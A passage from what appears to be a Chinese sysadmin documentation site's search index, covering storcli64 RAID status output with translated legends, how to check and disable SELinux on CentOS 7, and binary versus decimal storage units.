nolog'","title":"\u5e2e\u52a9"},{"location":"system/centos7/storcli/#raid","text":"\u4f8b\u5982\uff1a #storcli64 /c0 show Controller = 0 #\u51e0\u53f7\u63a7\u5236\u5668 Status = Success #\u72b6\u6001\u6210\u529f Description = None #\u63cf\u8ff0\u65e0 Product Name = AVAGO MegaRAID SAS 9361-8i #\u4ea7\u54c1\u578b\u53f7 Serial Number = SK01467706 #sn\u53f7 SAS Address = 500605b01018f980 #SAS\u5730\u5740 Mfg. Date = 04/02/20 #\u5236\u9020\u65e5\u671f System Time = 10/13/2023 11:24:04 #\u7cfb\u7edf\u65f6\u95f4 Controller Time = 10/13/2023 11:21:19 #\u63a7\u5236\u5668\u65f6\u95f4 FW Package Build = 24.21.0-0132 #FW\u5305\u6784\u5efa\u53f7 BIOS Version = 6.36.00.3_4.19.08.00_0x06180203 #bios\u7248\u672c FW Version = 4.680.00-8527 #FW\u7248\u672c Driver Name = megaraid_sas # \u9a71\u52a8\u540d\u5b57 Driver Version = 07.710.06.00 # \u9a71\u52a8\u7248\u672c Controller Bus Type = N/A # \u63a7\u5236\u5668\u603b\u7ebf\u7c7b\u578b PCI Slot = N/A # \u63d2\u69fd PCI Bus Number = 24 # PCI\u603b\u7ebf\u53f7 PCI Device Number = 0 # PCI\u8bbe\u5907\u7f16\u53f7 PCI Function Number = 0 # PCI\u529f\u80fd\u7f16\u53f7 Drive Groups = 2 # \u9a71\u52a8\u5668\u7ec4 TOPOLOGY : # \u62d3\u6251\u7ed3\u6784 ======== -------------------------------------------------------------------------- DG Arr Row EID:Slot DID Type State BT Size PDC PI SED DS3 FSpace -------------------------------------------------------------------------- 0 - - - - RAID5 Optl N 1.635 TB dsbl N N dflt N 0 0 - - - RAID5 Optl N 1.635 TB dsbl N N dflt N 0 0 0 8:0 20 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 1 8:1 11 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 2 8:2 15 DRIVE Onln N 558.406 GB dsbl N N dflt - 0 0 3 8:3 19 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 - - - - RAID5 Optl N 3.816 TB dsbl N N dflt N 1 0 - - - RAID5 Optl N 3.816 TB dsbl N N dflt N 1 0 0 8:4 12 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 1 8:5 17 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 2 8:6 16 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 3 8:7 9 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 4 8:8 10 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 5 8:9 14 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 6 8:10 13 DRIVE Onln N 558.406 GB dsbl N N dflt - 1 0 7 8:11 18 DRIVE Onln N 558.406 GB dsbl N N dflt - -------------------------------------------------------------------------- DG=Disk Group Index|Arr=Array Index|Row=Row Index|EID=Enclosure Device ID DID=Device ID|Type=Drive Type|Onln=Online|Rbld=Rebuild|Dgrd=Degraded Pdgd=Partially degraded|Offln=Offline|BT=Background Task Active PDC=PD Cache|PI=Protection Info|SED=Self Encrypting Drive|Frgn=Foreign DS3=Dimmer Switch 3|dflt=Default|Msng=Missing|FSpace=Free Space Present ###################################\u7ffb\u8bd1##################################### -------------------------------------------------------------------------- \u78c1\u76d8\u7ec4\u7d22\u5f15 \u9635\u5217\u7d22\u5f15 \u884c\u7d22\u5f15 \u8bbe\u5907\u67dc\u8bbe\u5907ID:\u63d2\u69fd \u8bbe\u5907ID \u9a71\u52a8\u5668\u7c7b\u578b \u72b6\u6001 \u540e\u53f0\u4efb\u52a1\u6d3b\u52a8 \u5927\u5c0f \u4fdd\u62a4\u6570\u636e\u7f13\u5b58 \u4fdd\u62a4\u4fe1\u606f \u81ea\u52a0\u5bc6\u786c\u76d8 \u8c03\u5149\u5f00\u5173 \u7a7a\u95f2\u7a7a\u95f4\u5b58\u5728 -------------------------------------------------------------------------- 0 - - - - RAID5 \u6700\u4f73 N 1.635 TB \u7981\u7528 N N \u9ed8\u8ba4 N 0 0 - - - RAID5 \u6700\u4f73 N 1.635 TB \u7981\u7528 N N \u9ed8\u8ba4 N 0 0 0 8:0 20 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 1 8:1 11 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 2 8:2 15 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 0 0 3 8:3 19 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 - - - - RAID5 \u6700\u4f73 N 3.816 TB \u7981\u7528 N N \u9ed8\u8ba4 N 1 0 - - - RAID5 \u6700\u4f73 N 3.816 TB \u7981\u7528 N N \u9ed8\u8ba4 N 1 0 0 8:4 12 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 1 8:5 17 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 2 8:6 16 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 3 8:7 9 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 4 8:8 10 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 5 8:9 14 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 6 8:10 13 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - 1 0 7 8:11 18 \u9a71\u52a8\u5668 \u5728\u7ebf N 558.406 GB \u7981\u7528 N N \u9ed8\u8ba4 - -------------------------------------------------------------------------- DG = \u78c1\u76d8\u7ec4\u7d22\u5f15 Arr = \u9635\u5217\u7d22\u5f15 Row = \u884c\u7d22\u5f15 EID = \u8bbe\u5907\u67dc\u8bbe\u5907ID DID = \u8bbe\u5907ID Type = \u9a71\u52a8\u5668\u7c7b\u578b Onln = \u5728\u7ebf Rbld = \u91cd\u5efa Dgrd = \u964d\u7ea7 Pdgd = \u90e8\u5206\u964d\u7ea7 Offln = \u79bb\u7ebf BT = \u540e\u53f0\u4efb\u52a1\u6d3b\u52a8 PDC = \u4fdd\u62a4\u6570\u636e\u7f13\u5b58 PI = \u4fdd\u62a4\u4fe1\u606f SED = \u81ea\u52a0\u5bc6\u786c\u76d8 Frgn = \u5916\u90e8 DS3 = \u8c03\u5149\u5f00\u5173 3 dflt = \u9ed8\u8ba4 Msng = \u7f3a\u5931 FSpace = \u7a7a\u95f2\u7a7a\u95f4\u5b58\u5728 ###################################\u7ffb\u8bd1##################################### Virtual Drives = 2 VD LIST : # VD\u5217\u8868 ======= ------------------------------------------------------------ DG/VD TYPE State Access Consist Cache sCC Size Name ------------------------------------------------------------ 0/0 RAID5 Optl RW Yes RWBD - 1.635 TB RaidGP1 1/1 RAID5 Optl RW Yes RWBD - 3.816 TB RaidGP2 ------------------------------------------------------------ Cac=CacheCade|Rec=Recovery|OfLn=OffLine|Pdgd=Partially Degraded|dgrd=Degraded Optl=Optimal|RO=Read Only|RW=Read Write|B=Blocked|Consist=Consistent| Ra=Read Ahead Adaptive|R=Read Ahead Always|NR=No Read Ahead|WB=WriteBack| AWB=Always WriteBack|WT=WriteThrough|C=Cached IO|D=Direct IO|sCC=Scheduled Check Consistency ###################################\u7ffb\u8bd1##################################### ------------------------------------------------------------ \u78c1\u76d8\u7ec4/\u865a\u62df\u78c1\u76d8\u7c7b\u578b \u72b6\u6001 \u8bbf\u95ee \u4e00\u81f4\u6027 \u7f13\u5b58 \u8ba1\u5212\u68c0\u67e5\u4e00\u81f4\u6027 \u5927\u5c0f \u540d\u79f0 ------------------------------------------------------------ 0/0 RAID5 \u6700\u4f73 \u8bfb\u5199 \u662f \u8bfb\u5199\u7f13\u5b58 - 1.635 TB RaidGP1 1/1 RAID5 \u6700\u4f73 \u8bfb\u5199 \u662f \u8bfb\u5199\u7f13\u5b58 - 3.816 TB RaidGP2 ------------------------------------------------------------ Cac = \u7f13\u5b58 Rec = \u6062\u590d OfLn = \u79bb\u7ebf Pdgd = \u90e8\u5206\u964d\u7ea7 dgrd = \u964d\u7ea7 Optl = \u6700\u4f73 RO = \u53ea\u8bfb RW = \u8bfb\u5199 B = \u963b\u6b62 Consist = \u4e00\u81f4 Ra = \u81ea\u9002\u5e94\u9884\u8bfb R = \u603b\u662f\u9884\u8bfb NR = \u4e0d\u9884\u8bfb WB = \u5199\u56de AWB = \u603b\u662f\u5199\u56de WT = \u76f4\u5199 C = \u7f13\u5b58IO D = \u76f4\u63a5IO sCC = \u8ba1\u5212\u68c0\u67e5\u4e00\u81f4\u6027 ###################################\u7ffb\u8bd1##################################### Physical Drives = 12 PD LIST : ======= ------------------------------------------------------------------------- EID:Slt DID State DG Size Intf Med SED PI SeSz Model Sp ------------------------------------------------------------------------- 8:0 20 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:1 11 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:2 15 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:3 19 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:4 12 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:5 17 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:6 16 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:7 9 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:8 10 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:9 14 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:10 13 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:11 18 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U ------------------------------------------------------------------------- EID-Enclosure Device ID|Slt-Slot No.|DID-Device ID|DG-DriveGroup DHS-Dedicated Hot Spare|UGood-Unconfigured Good|GHS-Global Hotspare UBad-Unconfigured Bad|Onln-Online|Offln-Offline|Intf-Interface Med-Media Type|SED-Self Encryptive Drive|PI-Protection Info SeSz-Sector Size|Sp-Spun|U-Up|D-Down|T-Transition|F-Foreign ###################################\u7ffb\u8bd1##################################### ------------------------------------------------------------------------- EID: \u8bbe\u5907\u67dc\u6807\u8bc6\u53f7 | Slt: \u63d2\u69fd\u7f16\u53f7 | DID: \u8bbe\u5907\u6807\u8bc6\u53f7 | State: \u72b6\u6001 | DG: \u9a71\u52a8\u7ec4 Size: \u5927\u5c0f | Intf: \u63a5\u53e3 | Med: \u5a92\u4f53\u7c7b\u578b | SED: \u81ea\u52a0\u5bc6\u9a71\u52a8 | PI: \u4fdd\u62a4\u4fe1\u606f | SeSz: \u6247\u533a\u5927\u5c0f Model: \u578b\u53f7 | Sp: \u78c1\u76d8\u9a71\u52a8\u5668\u65cb\u8f6c\u72b6\u6001 ------------------------------------------------------------------------- 8:0 20 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:1 11 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:2 15 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:3 19 Onln 0 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:4 12 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:5 17 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:6 16 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:7 9 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:8 10 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:9 14 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:10 13 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U 8:11 18 Onln 1 558.406 GB SAS HDD N N 512B ST600MM0009 U ------------------------------------------------------------------------- - EID: \u8bbe\u5907\u67dc\u6807\u8bc6\u53f7 - Slt: \u63d2\u69fd\u7f16\u53f7 - DID: \u8bbe\u5907\u6807\u8bc6\u53f7 - DG: \u9a71\u52a8\u7ec4 - DHS: \u4e13\u7528\u70ed\u5907 - UGood: \u672a\u914d\u7f6e\u597d - GHS: \u5168\u5c40\u70ed\u5907 - UBad: \u672a\u914d\u7f6e\u4e0d\u4f73 - Onln: \u5728\u7ebf - Offln: \u79bb\u7ebf - Intf: \u63a5\u53e3 - Med: \u5a92\u4f53\u7c7b\u578b - SED: \u81ea\u52a0\u5bc6\u9a71\u52a8 - PI: \u4fdd\u62a4\u4fe1\u606f - SeSz: \u6247\u533a\u5927\u5c0f - Sp: \u65cb\u8f6c\u4e2d - U: \u542f\u52a8 - D: \u505c\u7528 - T: \u72b6\u6001\u8f6c\u6362 - F: \u5916\u90e8\u7684 ###################################\u7ffb\u8bd1##################################### BBU_Info : ======== ----------------------------------------------------------------------- Model State RetentionTime Temp Mode MfgDate Next Learn ----------------------------------------------------------------------- CVPM02 Optimal 0 hour(s) 26C 0 2019/11/02 2023/10/17 09:23:25 ----------------------------------------------------------------------- ###################################\u7ffb\u8bd1##################################### BBU\u4fe1\u606f\uff1a ======== ----------------------------------------------------------------------- \u578b\u53f7 \u72b6\u6001 \u4fdd\u6301\u65f6\u95f4 \u6e29\u5ea6 \u6a21\u5f0f \u5236\u9020\u65e5\u671f \u4e0b\u6b21\u5b66\u4e60 ----------------------------------------------------------------------- CVPM02 \u6b63\u5e38 0 \u5c0f\u65f6 26\u6444\u6c0f\u5ea6 0 2019/11/02 2023/10/17 09:23:25 ----------------------------------------------------------------------- \"\u4fdd\u6301\u65f6\u95f4\"\uff08RetentionTime\uff09\u901a\u5e38\u662f\u6307\u7535\u6c60\u5907\u4efd\u5355\u5143\uff08BBU\uff09\u80fd\u591f\u5728\u65ad\u7535\u6216\u6545\u969c\u60c5\u51b5\u4e0b\u4fdd\u6301\u5176\u5145\u7535\u72b6\u6001\uff0c\u4ee5\u7ee7\u7eed\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u7684\u65f6\u95f4\u3002\u5b83\u8868\u793a\u5728\u65ad\u7535\u60c5\u51b5\u4e0b\uff0cBBU\u53ef\u4ee5\u4fdd\u6301\u5145\u7535\u72b6\u6001\u5e76\u7ee7\u7eed\u4f9b\u7535\u7684\u65f6\u95f4\u957f\u5ea6\u3002\u5728\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u7684\u60c5\u51b5\u4e0b\uff0c\u6570\u636e\u53ef\u4ee5\u88ab\u4fdd\u5b58\u6216\u5b8c\u6210\u5199\u5165\u78c1\u76d8\uff0c\u4ee5\u907f\u514d\u6570\u636e\u4e22\u5931\u6216\u635f\u574f\u3002 \"\u4fdd\u6301\u65f6\u95f4\"\u7684\u503c\u662f \"0 \u5c0f\u65f6\"\uff0c\u8fd9\u8868\u793a\u7535\u6c60\u5907\u4efd\u5355\u5143\u76ee\u524d\u6ca1\u6709\u4fdd\u6301\u65f6\u95f4\uff0c\u5373\u5b83\u53ef\u80fd\u65e0\u6cd5\u5728\u65ad\u7535\u60c5\u51b5\u4e0b\u63d0\u4f9b\u7535\u6e90\u652f\u6301\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cBBU\u5e94\u8be5\u5177\u6709\u975e\u96f6\u7684\u4fdd\u6301\u65f6\u95f4\u4ee5\u63d0\u4f9b\u6570\u636e\u4fdd\u62a4\u3002 \"\u6a21\u5f0f\"\uff08Mode\uff09\u662f\u63cf\u8ff0\u7535\u6c60\u5907\u4efd\u5355\u5143\uff08BBU\uff09\u7684\u5de5\u4f5c\u6a21\u5f0f\u7684\u4fe1\u606f\u3002\u4e0d\u540c\u7684\u5de5\u4f5c\u6a21\u5f0f\u53ef\u80fd\u4f1a\u5f71\u54cd\u7535\u6c60\u7684\u884c\u4e3a\u548c\u6027\u80fd\u3002 \"\u6a21\u5f0f\"\u7684\u503c\u662f \"0\"\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0d\u540c\u7684\u6570\u5b57\u4ee3\u8868\u4e0d\u540c\u7684\u5de5\u4f5c\u6a21\u5f0f\u3002\u5177\u4f53\u7684\u6a21\u5f0f\u542b\u4e49\u53ef\u80fd\u56e0\u5236\u9020\u5546\u548c\u8bbe\u5907\u800c\u5f02\uff0c\u901a\u5e38\u6a21\u5f0f 0 \u8868\u793a\u6b63\u5e38\u8fd0\u884c\u6216\u4f18\u5316\u6a21\u5f0f\u3002\u4e0d\u540c\u7684\u6a21\u5f0f\u53ef\u4ee5\u5bf9\u7535\u6c60\u5145\u7535\u3001\u653e\u7535\u548c\u5907\u4efd\u64cd\u4f5c\u4ea7\u751f\u5f71\u54cd\uff0c\u56e0\u6b64\u4e86\u89e3\u7535\u6c60\u5907\u4efd\u5355\u5143\u7684\u6a21\u5f0f\u5bf9\u4e8e\u7ef4\u62a4\u548c\u76d1\u63a7\u7535\u6e90\u652f\u6301\u975e\u5e38\u91cd\u8981\u3002 ###################################\u7ffb\u8bd1##################################### \u4e0a\u6587\u4e2d\u63d0\u5230\u7684\u4f8b\u5b50\uff0c\u5728\u5e26\u5916\u7cfb\u7edf\u4e5f\u53ef\u4ee5\u67e5\u8be2\u5230\uff1a \u8981\u4f7f\u7528 storcli64 \u547d\u4ee4\u6765\u67e5\u770b\u6240\u6709\u78c1\u76d8\u7684\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a storcli64 /c0 /eall /sall show \u8fd9\u91cc\u7684\u53c2\u6570\u89e3\u91ca\u5982\u4e0b\uff1a storcli64 \uff1a\u8fd9\u662f\u547d\u4ee4\u884c\u5de5\u5177\u7684\u540d\u79f0\u3002 /c0 \uff1a\u8868\u793a\u63a7\u5236\u5668\u7f16\u53f7\uff0c0\u662f\u7b2c\u4e00\u4e2a\u63a7\u5236\u5668\u3002\u5982\u679c\u4f60\u6709\u591a\u4e2a\u63a7\u5236\u5668\uff0c\u53ef\u80fd\u9700\u8981\u6539\u53d8\u8fd9\u4e2a\u6570\u5b57\u3002 /eall \uff1a\u8868\u793a\u6240\u6709\u7684\u673a\u7bb1\uff08enclosure\uff09\uff0c\u5982\u679c\u4f60\u6709\u591a\u4e2a\u673a\u7bb1\uff0c\u8fd9\u4f1a\u663e\u793a\u6240\u6709\u673a\u7bb1\u7684\u4fe1\u606f\u3002 /sall \uff1a\u8868\u793a\u6240\u6709\u7684\u69fd\u4f4d\uff08slot\uff09\uff0c\u5373\u663e\u793a\u6240\u6709\u78c1\u76d8\u69fd\u4f4d\u7684\u4fe1\u606f\u3002 show \uff1a\u8fd9\u4e2a\u53c2\u6570\u6307\u793astorcli\u663e\u793a\u4fe1\u606f\u3002 \u8fd0\u884c\u6b64\u547d\u4ee4\u540e\uff0c\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a\u5305\u542b\u6240\u6709\u78c1\u76d8\u72b6\u6001\u7684\u5217\u8868\uff0c\u5176\u4e2d\u5305\u62ec\u6bcf\u4e2a\u78c1\u76d8\u7684\u72b6\u6001\u3001\u5927\u5c0f\u3001\u7c7b\u578b\u7b49\u4fe1\u606f\u3002","title":"\u663e\u793araid\u4fe1\u606f"},{"location":"system/centos7/%E5%85%B3%E9%97%ADselinux/","text":"\u67e5\u770bselinux\u72b6\u6001 [root@localhost ~]# sestatus -help \u7528\u6cd5: sestatus [OPTION] -v \u5bf9\u8fdb\u7a0b\u548c\u6587\u4ef6\u4e0a\u4e0b\u6587\u8fdb\u884c\u8be6\u7ec6\u68c0\u67e5\u3002 -b \u663e\u793a\u5e03\u5c14\u503c\u7684\u5f53\u524d\u72b6\u6001\u3002 \u4e0d\u5e26\u9009\u9879\uff0c\u663e\u793aSELinux\u72b6\u6001\u3002 [root@localhost ~]# sestatus SELinux status: enabled SELinuxfs mount: /selinux Current mode: enforcing Mode from config file: enforcing Policy version: 29 Policy from config file: targeted \u6839\u636e\u4e0a\u6587\u63d0\u4f9b\u7684 sestatus \u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u4e86\u89e3\u5230 SELinux\uff08Security-Enhanced Linux\uff09\u5728\u60a8\u7684\u7cfb\u7edf\u4e0a\u7684\u914d\u7f6e\u548c\u72b6\u6001\uff1a SELinux \u72b6\u6001 : \u542f\u7528\uff08 enabled \uff09\u3002 \u8fd9\u8868\u793a SELinux \u5728\u60a8\u7684\u7cfb\u7edf\u4e0a\u662f\u6fc0\u6d3b\u7684\uff0c\u6b63\u5728\u8fd0\u884c\u3002 SELinux \u6587\u4ef6\u7cfb\u7edf\u6302\u8f7d\u70b9 : /selinux \u3002 \u8fd9\u662f SELinux \u6587\u4ef6\u7cfb\u7edf\u5728\u60a8\u7cfb\u7edf\u4e0a\u7684\u6302\u8f7d\u4f4d\u7f6e\u3002 \u5f53\u524d\u6a21\u5f0f : \u5f3a\u5236\uff08 enforcing \uff09\u3002 \u8fd9\u610f\u5473\u7740 SELinux \u6b63\u5728\u5f3a\u5236\u6267\u884c\u5176\u5b89\u5168\u7b56\u7565\u3002\u8fdd\u53cd\u8fd9\u4e9b\u7b56\u7565\u7684\u884c\u4e3a\u5c06\u88ab\u963b\u6b62\u3002 \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6a21\u5f0f : \u5f3a\u5236\uff08 enforcing \uff09\u3002 \u8fd9\u8868\u660e SELinux \u7684\u5f3a\u5236\u6a21\u5f0f\u662f\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\uff08\u901a\u5e38\u662f `/etc/selinux/config`\uff09\u8bbe\u7f6e\u7684\uff0c\u5e76\u4e14\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u751f\u6548\u3002 \u7b56\u7565\u7248\u672c : 29\u3002 \u8fd9\u663e\u793a\u4e86 SELinux \u4f7f\u7528\u7684\u7b56\u7565\u7248\u672c\u53f7\u3002 \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u7b56\u7565 : \u9488\u5bf9\u6027\uff08 targeted \uff09\u3002 SELinux \u7684\u201ctargeted\u201d\u7b56\u7565\u662f\u4e00\u79cd\u5e38\u7528\u7684\u7b56\u7565\u7c7b\u578b\uff0c\u5b83\u4e3b\u8981\u5173\u6ce8\u5bf9\u7cfb\u7edf\u4e2d\u7684\u7279\u5b9a\u76ee\u6807\uff08\u5982\u7f51\u7edc\u5b88\u62a4\u8fdb\u7a0b\u548c\u516c\u5171\u670d\u52a1\uff09\u65bd\u52a0\u5b89\u5168\u63a7\u5236\uff0c\u800c\u4e0d\u662f\u5bf9\u6574\u4e2a\u7cfb\u7edf\u65bd\u52a0\u5168\u9762\u7684\u63a7\u5236\u3002 \u8981\u5173\u95ed SELinux\uff0c\u4f60\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u64cd\u4f5c\uff1a \u4e34\u65f6\u5173\u95ed SELinux : \u4f7f\u7528 `setenforce 0` \u547d\u4ee4\u53ef\u4ee5\u4e34\u65f6\u5c06 SELinux \u8bbe\u7f6e\u4e3a\u5bbd\u5bb9\u6a21\u5f0f\uff08Permissive\uff09\uff0c\u8fd9\u5b9e\u9645\u4e0a\u4f1a\u7981\u7528 SELinux \u7684\u5f3a\u5236\u7b56\u7565\uff0c\u4f46\u4ecd\u4f1a\u8bb0\u5f55\u8fdd\u53cd\u653f\u7b56\u7684\u884c\u4e3a\u3002\u8fd9\u79cd\u66f4\u6539\u53ea\u5728\u5f53\u524d\u4f1a\u8bdd\u6709\u6548\uff0c\u91cd\u542f\u540e\u4f1a\u6062\u590d\u3002 \u6c38\u4e45\u5173\u95ed SELinux : \u7f16\u8f91 `/etc/selinux/config` \u6587\u4ef6\u3002 \u627e\u5230 `SELINUX=enforcing` \u6216 `SELINUX=permissive` \u8fd9\u4e00\u884c\uff0c\u5e76\u5c06\u5176\u66f4\u6539\u4e3a `SELINUX=disabled`\u3002 \u4fdd\u5b58\u6587\u4ef6\u5e76\u91cd\u542f\u7cfb\u7edf\u3002","title":"\u5173\u95edselinux"},{"location":"system/centos7/%E5%90%84%E7%A7%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E5%92%8C%E7%BD%91%E9%80%9F%E5%8D%95%E4%BD%8D/","text":"\u5404\u79cd\u8ba1\u7b97\u673a\u5b58\u50a8\u5355\u4f4d\u548c\u7f51\u901f\u5355\u4f4d \u9996\u5148\u8981\u641e\u61c2\u5404\u79cd\u5b58\u50a8\u5355\u4f4d MiB \u662fMebibyte\u7684\u7f29\u5199\uff0c Mebibyte - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \uff0c1 MiB = 2\u768420\u6b21\u65b9 byte s = 1024 kibibyte s = 1048576bytes kibibyte KiB 2\u768410\u6b21\u65b9\u5b57\u8282 mebibyte MiB 2\u768420\u6b21\u65b9\u5b57\u8282 gibibyte GiB 2\u768430\u6b21\u65b9\u5b57\u8282 tebibyte TiB 2\u768440\u6b21\u65b9\u5b57\u8282 pebibyte PiB 2\u768450\u6b21\u65b9\u5b57\u8282 exbibyte EiB 2\u768460\u6b21\u65b9\u5b57\u8282 zebibyte ZiB 2\u768470\u6b21\u65b9\u5b57\u8282 yobibyte YiB 2\u768480\u6b21\u65b9\u5b57\u8282 MB \u662fMegabyte\u7684\u7f29\u5199\uff0c \u5146\u5b57\u8282 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org) \uff0c1MB = 1,000,000\uff0810\u76846\u6b21\u65b9\uff09 B \uff0c\u4e00\u767e\u4e07\u4e2abyte \u5343\u5b57\u8282 KB 10\u76843\u6b21\u65b9\u5b57\u8282 \u5146\u5b57\u8282 MB 10\u76846\u6b21\u65b9\u5b57\u8282 \u5409\u5b57\u8282 GB 10\u76849\u6b21\u65b9\u5b57\u8282 \u592a\u5b57\u8282 TB 10\u768412\u6b21\u65b9\u5b57\u8282 \u62cd\u5b57\u8282 PB 10\u768415\u6b21\u65b9\u5b57\u8282 \u827e\u5b57\u8282 EB 10\u768418\u6b21\u65b9\u5b57\u8282 \u6cfd\u5b57\u8282 ZB 10\u768421\u6b21\u65b9\u5b57\u8282 \u5c27\u5b57\u8282 YB 10\u768424\u6b21\u65b9\u5b57\u8282 \u5bb9\u5b57\u8282 RB 10\u768427\u6b21\u65b9\u5b57\u8282 \u6606\u5b57\u8282 QB 10\u768430\u6b21\u65b9\u5b57\u8282 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5355\u4f4d\u7f29\u5199\u4e2d\u95f4\u5e26i\uff0c\u76f8\u5dee1024\u500d\uff0c\u5355\u4f4d\u4e2d\u4e0d\u5e26i\u7684\uff0c\u76f8\u5dee1000\u500d \u56fd\u5185\u5f88\u591a\u7f51\u7ad9\u90fd\u4f1a\u628aMB\u5f53\u4f5cMiB\uff0c\u8d34\u4e00\u4e2a\u5728\u7ebf\u6362\u7b97\u5de5\u5177 \u5b57\u8282\u5355\u4f4d\u6362\u7b97\u5668_Gb,Kb,Mb\u5355\u4f4d\u6362\u7b97\u5de5\u5177 - \u7535\u5b50\u53d1\u70e7\u53cb(www.elecfans.com) \u7ecf\u5e38\u6df7\u6dc6\u7684\u4e24\u4e2a\u70b9 k \u4e0e Ki k \u4e0e Ki \u5206\u522b\u8868\u793a kilo-\uff08\u5343\uff09 \u4e0e kibi-\uff08\u4e8c\u8fdb\u5236\u5343\uff09 \u3002\u4f5c\u4e3a\u524d\u7f00\u4f7f\u7528\u65f6\uff0c k \u8868\u793a 1,000 \uff0cKi \u8868\u793a 1,024 \uff0c\u56e0\u4e3a\u201cKi\u201d\u6765\u6e90\u4e8e\u5b83\u5728\u8ba1\u7b97\u673a\u65b9\u9762 2\u768410\u6b21\u65b9 = 1,024 \u7684\u4f7f\u7528\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u4eba\u4eec\u5e38\u5e38\u9519\u8bef\u5730\u7528 K \u4ee3\u66ff Ki\u3002\u6b64\u5916\uff0c\u4e0d\u77e5\u6653\u5176\u4e2d\u5fae\u5999\u5dee\u522b\u7684\u5e7f\u5927\u516c\u4f17\uff0c\u5e38\u5e38\u4e0d\u52a0\u533a\u522b\u5730\u4f7f\u7528\u201cKbps\u201d\u4e0e\u201cKibps\u201d\uff0c\u9020\u6210\u4e86\u6df7\u4e71\u3002\u603b\u4e4b\uff0c\u4f7f\u7528\u201cKibps\u201d\u901a\u5e38\u662f\u6b63\u786e\u7684\u3002 b \u4e0e B b \u4ee3\u8868 bit\uff08\u6bd4\u7279\uff09\uff0cB \u4ee3\u8868 byte\uff08\u5b57\u8282\uff09\uff0c1 \u5b57\u8282 \u5373 8 \u6bd4\u7279 \u3002\u8fd9\u4f1a\u5bfc\u81f4\u6df7\u6dc6\u3002\u6bd4\u5982\u5f53\u201c1M\uff081 Meg\uff0c1 \u5146\uff09\u7f51\u7edc\u8fde\u63a5\u201d\u5b57\u6837\u51fa\u73b0\u5728\u5e7f\u544a\u4e0a\u65f6\uff0c\u5b83\u5e38\u5e38\u8868\u793a 1 Mib/s\uff08mebibit per 